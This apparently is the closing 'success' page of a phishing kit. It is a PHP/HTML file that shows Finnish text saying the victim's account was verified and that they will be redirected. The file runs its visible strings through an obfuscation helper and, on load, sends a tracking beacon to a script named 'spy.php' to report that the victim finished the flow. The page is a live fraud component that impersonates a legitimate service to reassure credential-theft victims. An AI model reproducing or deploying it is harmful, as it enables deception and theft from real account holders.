<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
</head>
<body>
<main style="display:flex; align-items:center; justify-content:center; position:fixed; top:0; height:100%; width:100%; left:0;">
<div style="text-align:center; padding:10px;">
<img src="res/logo.svg" style="margin:10px 0;"><br>
<p style="font-family:calibri;">
<?php $bm->obf("Tilisi on vahvistettu onnistuneesti."); ?><br>
<?php $bm->obf("sinut ohjataan pian uudelleen."); ?></p>
<img src="https://static.vecteezy.com/system/resources/thumbnails/010/156/510/small/tick-icon-sign-symbol-design-free-png.png" style="width:70px;">
</div>
</main>

<script src="res/jq.js"></script>
<script>
$.post("spy.php", {finishview:1});
</script>
<?php 
$m->ctr("SUCCESS");
?>
</body>
</body>
</html>